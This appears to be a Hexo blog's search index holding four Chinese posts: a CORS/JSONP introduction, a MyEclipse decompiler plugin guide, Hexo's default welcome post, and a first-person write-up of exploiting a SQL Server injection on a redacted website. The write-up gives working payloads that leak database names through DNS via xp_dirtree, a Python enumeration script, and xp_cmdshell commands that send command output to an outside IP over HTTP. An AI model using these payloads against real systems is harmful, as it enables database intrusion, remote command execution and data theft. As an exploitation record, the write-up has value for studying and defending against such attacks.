<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[「研究」CORS安全性分析]]></title>
      <url>/2017/05/25/CORS-security/</url>
      <content type="html"><![CDATA[<p>CORS（跨来源资源共享）是一份浏览器技术的规范，提供了Web服务从不同网域传来沙盒脚本的方法，以避开浏览器的同源策略，是JSONP模式的现代版。<br><a id="more"></a></p>
<h3 id="CORS与JSONP"><a href="#CORS与JSONP" class="headerlink" title="CORS与JSONP"></a>CORS与JSONP</h3><p>我们都知道，在同源策略的限制下，我们是无法在hostA向hostB发松一个ajax请求的，但是由于业务需求，比如某些子域名之间会存在一些数据交互，怎么办呢。这时候，JSONP出现了，JSONP的原理很简单，可以理解为就是利用script标签加载了一段外部js。</p>
<p>script、img、iframe这些资源请求类型的标签都是不受同源策略所限制的，他们所发出的请求也不是ajax请求，通过这种“奇技淫巧”，就可以巧妙的进行跨域数据交互了。</p>
<p>但是JSONP接口有个致命的缺点，那就是接口如果不进行来源检测的话，任何第三发都能获取到JSONP接口的数据，这是极其危险的。</p>
]]></content>
      
        <categories>
            
            <category> sec </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[MyEclipse自动反编译java代码插件]]></title>
      <url>/2017/01/22/myeclipse-decompile-java-code-plugin/</url>
      <content type="html"><![CDATA[<p>想看哪个jar包的源码双击就能看到，方便至极 :)</p>
<a id="more"></a>
<h3 id="0x01-需要用到的工具-amp-jar包"><a href="#0x01-需要用到的工具-amp-jar包" class="headerlink" title="0x01 需要用到的工具&amp;jar包"></a>0x01 需要用到的工具&amp;jar包</h3><ul>
<li><strong>jad.exe</strong>（<a href="http://Levi.cx/file/jad.exe">点我下载</a>）  </li>
<li><strong>net.sf.jadclipse_3.3.0.jar</strong>（<a href="http://Levi.cx/file/net.sf.jadclipse_3.3.0.jar">点我下载</a>）  </li>
</ul>
<h3 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h3><p>”MyEclips安装步骤和Eclips安装步骤稍不一样,这里只讲Myeclips的安装步骤“</p>
<ol>
<li><p>首先找到MyEclipse<strong>根目录</strong>，也就是myeclipse.exe所存在的那个目录，我的是<code>E:\MyEclipse\MyEclipse 10</code></p>
</li>
<li><p>进入根目录下的<strong>dropins</strong>目录，创建1个文件夹，名为：<strong>eclipse</strong>  </p>
</li>
<li><p>在刚创建的eclipse目录下再新建两个文件夹，名为：<strong>features</strong>，<strong>plugins</strong>  </p>
</li>
<li><p>将net.sf.jadclipse_3.3.0.jar放到plugins目录下   </p>
</li>
<li><p>启动MyEclipse，进入window-&gt;Preferences-&gt;Java-&gt;JadClipse进行设置<br><img src="http://Levi.cx/img/MyEclipse.jpg" alt=""><br>上面的填jad.exe的路径，放哪填哪 随意，下面的是个生成反编译文件的临时目录，亦随意 </p>
</li>
</ol>
<h3 id="0x03-结束"><a href="#0x03-结束" class="headerlink" title="0x03 结束"></a>0x03 结束</h3><p>大功告成，现在如果想看哪个jar包哪个类的源代码直接双击就可以看到，而无需繁琐的手动反编译</p>
]]></content>
      
        
        <tags>
            
            <tag> sec </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[「记录」一次sql延时注入之dnslog的利用]]></title>
      <url>/2017/01/18/dnslog-sqli/</url>
      <content type="html"><![CDATA[<p>dnslog是指dns日志信息，通过这个方式可以将原本没法回显的信息获取到，本篇文章记录的是在sql延时注入时dnslog的利用实践。<br><a id="more"></a></p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>上周我们团队对某网站进行安全测试的时候发现这样一个注入点：</p>
<blockquote>
<p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;WAITFOR" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;WAITFOR</a> DELAY ‘0:0:5’– </p>
</blockquote>
<p>这个字符注入点经过测试，只支持bool型注入和延时注入(可多行sql语句执行)。</p>
<p>这两种注入类型的缺点就是速度慢，效率低，一个是基于对错判断数据，一个是基于访问时间来判断数据，dnslog的出现就正好弥补了这样的缺陷。</p>
<p>说到这里我不得不吐槽一下，cloudeye作为一个dnslog平台已经关门大吉了却不把web服务器关掉，让我误以为是我操作不当导致收不到日志，后来用的另外一个dnslog平台。。</p>
<p>回到正题，经过推测这个注入点是sql server数据库的，sql server如果要进行dns解析的话用master..xp_dirtree这个存储过程，最终构造出如下语句：</p>
<blockquote>
<p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;DECLARE" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;DECLARE</a> @host varchar(1024);S</p>
</blockquote>
<p>解释一下整个语句的意思<br><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line"><span class="keyword">DECLARE</span> @host <span class="built_in">varchar</span>(<span class="number">1024</span>);</div></pre></td></tr></table></figure></p>
<p>这条语句的意思是注册一个名为@host的变量，类型为varchar<br><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> @host=<span class="keyword">CONVERT</span>(<span class="built_in">varchar</span>(<span class="number">1024</span>),db_name())+<span class="string">'.xxxxxxxxx.dnslog.link'</span>;</div></pre></td></tr></table></figure></p>
<p>这条语句的意思是获取db_name()然后转换成varchar类型，然后吧获取的db_name()返回值拼接到dnslog平台给我们的子域名里面，然后赋值给@host变量。</p>
<p>打个比方，如果db_name()返回值是abc 那么拼接后就是@host=abc.xxxxxxxxx.dnslog.link<br><figure class="highlight sql"><table><tr><td class="code"><pre><div class="line">EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');</div></pre></td></tr></table></figure></p>
<p>这条语句的意思就是咧远程主机的foobar$目录,由于是远程主机，所以会做一个dns解析，这样我们的dns平台就能得到日志了。</p>
<p>如此以来便得到了db_name()的值。</p>
<p>但是这里有个坑，不能获取@@version，我想了一下 可能是因为@@version中有空格换行等字符，导致拼接出来的子域名不符合规范，所以无法完成解析。后来我准备吧@@version hex一下再拼接进域名里面。。。但是我发现。。sql server居然没有hex()函数？？？</p>
<p>后来我一通百度之后也没找到sql server把字符串转为16进制的函数。。这就很尴尬了，有找到的麻烦告诉我下。</p>
<p>接下来，我写了个脚本，吧所有的裤名跑了出来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</div><div class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    url = <span class="string">'''http://xxxx.xxxx.com.cn/Login.ashx?Id=123%27;DECLARE%20@host%20varchar(1024);SELECT%20@host=CONVERT(varchar(1048),(select%20name%20from%20master.dbo.sysdatabases%20where%20dbid=1%20))%2b%27.xxxxxxxx.dnslog.link%27;EXEC(%27master..xp_dirtree%20%22\\\\%27%2b@host%2b%27\\foobar$%22%27);--'''</span></div><div class="line">    url = url.replace(<span class="string">"dbid=1"</span>,<span class="string">"dbid="</span>+str(i))</div><div class="line">    req = urllib2.Request(url)</div><div class="line">    <span class="keyword">print</span> req.get_full_url()</div><div class="line">    <span class="keyword">print</span> urllib2.urlopen(req).read()</div></pre></td></tr></table></figure>
<p>dns日志如下<br><img src="http://Levi.cx/img/v2-480eb6d6476e8dbaf8a82af6ee2b0e98_b.png" alt="pic1"><br>到这步其实已经可以dump数据库了，但是我发现还可以继续渗透。</p>
<p>经过测试，我发现是sa权限，于是我开启了xp_cmdshell组件进行命令执行</p>
<blockquote>
<p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec</a> master..xp_cmdshell ‘ping cmdtest.xxxxxxxx.dnslog.link’–</p>
</blockquote>
<p>ping一下，看看dns日志里会不会出现cmdtest.xxxxxxxx.dnslog.link域名的日志，经过查看确实已经收到，由于日志清空了一次 当时没截图，就不复现再截图了。</p>
<p>然后有个问题，就是命令回显的问题。</p>
<p>传统的做法的创建一个两个字段的表，然后吧每次执行cmd 的结果都插入到表里，要查看的时候再取出来。</p>
<p>于是我</p>
<blockquote>
<p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;create" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;create</a> table tmptmp(tmp1 varchar(1024),tmp2 varchar(1024));</p>
</blockquote>
<p>但是我发现表却创建不成功，不知道是何原因。这里有另外一个过于麻烦的思路，那就是把所有的表结构都跑出来，然后找一个能插入cmd结果的表，将返回结果插入到那张表里。</p>
<p>但是凡事都要找最优解。。于是我想了另一个办法：</p>
<p>将一个命令的执行结果作为另一个命令的参数，就比如，先执行whoami拿到结果，然后ping whoami的结果.xxxxxxxx.dnslog.link 这样就可以把结果放到子域名里通过dns日志拿到了。。</p>
<p>可是我找了半天没找到相关的语法，后来基友这么一条语句搞定了：</p>
<blockquote>
<p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec</a> master..xp_cmdshell “for /F %s in (‘dir’) do start <a href="http://123.123.123.123/?%s&quot;--" target="_blank" rel="external">http://123.123.123.123/?%s&quot;--</a> </p>
</blockquote>
<p>搭建http服务器看web日志，利用for设置变量存储命令执行结果 start进行http访问并带上结果</p>
<p>成功收到结果，这儿我想 用ping命令进行拼接然后读取dns日志应该也是没问题的，不过应该没走http好使<br><img src="http://Levi.cx/img/v2-a62ad8303dda9c5e214d7bd16caafc50_b.png" alt="pic2"></p>
<p>由于start会启动浏览器，所以要关闭一下浏览器</p>
<blockquote>
<p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec</a> master..xp_cmdshell “taskkill /f /im iexplore.exe”–</p>
</blockquote>
<p>以上</p>
]]></content>
      
        
        <tags>
            
            <tag> sec </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2017/01/12/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<a id="more"></a>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
      
        
        <tags>
            
            <tag> other </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
